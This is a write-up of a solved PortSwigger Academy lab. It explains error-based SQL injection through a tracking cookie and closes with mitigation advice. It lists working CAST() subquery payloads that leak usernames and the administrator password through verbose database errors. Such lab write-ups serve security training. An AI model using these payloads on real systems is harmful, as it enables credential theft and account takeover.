## Lab 13: Visible Error-Based SQL Injection

### Platform

PortSwigger Web Security Academy

### Difficulty

Practitioner

### Topic

SQL Injection / Error-Based SQL Injection / Visible Database Errors

### Lab Status

Solved

### Objective

The goal of this lab was to exploit a SQL injection vulnerability in the `TrackingId` cookie and leak the administrator user's password through a visible database error message.

### Simple Explanation

In this lab, the application did not display SQL query results directly.

However, when the SQL query caused an error, the application displayed a detailed database error message.

By injecting a query that forced the database to convert text data into an integer, the application leaked the returned value inside the error message.

This allowed the administrator password to be exposed directly instead of extracting it character by character.

### Vulnerability Description

The application used the value of the `TrackingId` cookie inside a SQL query without secure handling.

When invalid SQL syntax or invalid type conversion occurred, the application returned verbose database error messages.

These visible errors revealed sensitive backend information, including parts of the SQL query and values returned from the database.

This created a visible error-based SQL injection vulnerability.

### Key Concept

Error-based SQL injection relies on database error messages to leak information.

Instead of using true or false responses, the attacker intentionally causes an error that includes database output in the response.

In this lab, the `CAST()` function was used to force a text value, such as a username or password, to be converted into an integer.

Because usernames and passwords are text values, the conversion failed and the database error displayed the leaked value.

### Steps Taken

Intercepted the request containing the `TrackingId` cookie.

Sent the request to Burp Repeater.

Added a single quotation mark to the `TrackingId` value.

Observed a verbose SQL error message in the response.

Confirmed that the injected value appeared inside a single-quoted SQL string.

Added SQL comment characters to make the query syntactically valid.

Tested a basic `CAST()` payload using `SELECT 1`.

Modified the payload to include a valid boolean comparison.

Changed the subquery to retrieve usernames from the `users` table.

Observed that the query initially returned more than one row.

Used `LIMIT 1` to return only one row.

Observed that the database error leaked the username `administrator`.

Modified the query to retrieve the password instead of the username.

Observed that the database error leaked the administrator password.

Logged in as the administrator user.

Successfully solved the lab.

### Important Payload Logic

The main payload used this idea:

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

The database tried to execute:

```sql
CAST(password AS int)
```

Since the password is text and cannot be converted into an integer, the database returned an error.

The error message included the password value, which caused sensitive data leakage.

### Example Payloads

Testing for SQL injection:

```sql
TrackingId=abc123'
```

Commenting out the rest of the query:

```sql
TrackingId=abc123'--
```

Testing a valid `CAST()` expression:

```sql
TrackingId=abc123' AND 1=CAST((SELECT 1) AS int)--
```

Leaking the first username:

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Leaking the administrator password:

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

### Result

The administrator password was successfully leaked through a visible database error message.

The recovered password was then used to log in as the administrator user and solve the lab.

### What I Learned

Verbose database errors can expose sensitive information.

Error-based SQL injection can leak data directly through error messages.

The `CAST()` function can be abused to trigger type conversion errors.

A failed conversion from text to integer can reveal the original text value.

SQL comments can be used to remove the remaining part of the original query.

`LIMIT 1` can be used to ensure that a subquery returns only one row.

Visible error-based SQL injection can be faster than blind SQL injection because data may be leaked directly.

### Security Impact

In a real-world application, this vulnerability could allow attackers to extract sensitive database information such as usernames, passwords, session tokens, API keys, and personal data.

Verbose error messages can also reveal database structure, query syntax, and backend technology, making further attacks easier.

### Mitigation

To prevent this vulnerability, developers should:

Use parameterized queries or prepared statements.

Avoid inserting user-controlled input directly into SQL queries.

Validate and sanitize all user-controlled input, including cookies.

Disable verbose database error messages in production.

Use generic error messages for users.

Log detailed errors only on the server side.

Apply least-privilege database permissions.

Monitor unusual SQL error patterns.

### Tools Used

PortSwigger Web Security Academy

Burp Suite Community Edition

Burp Proxy

Burp Repeater

Web Browser

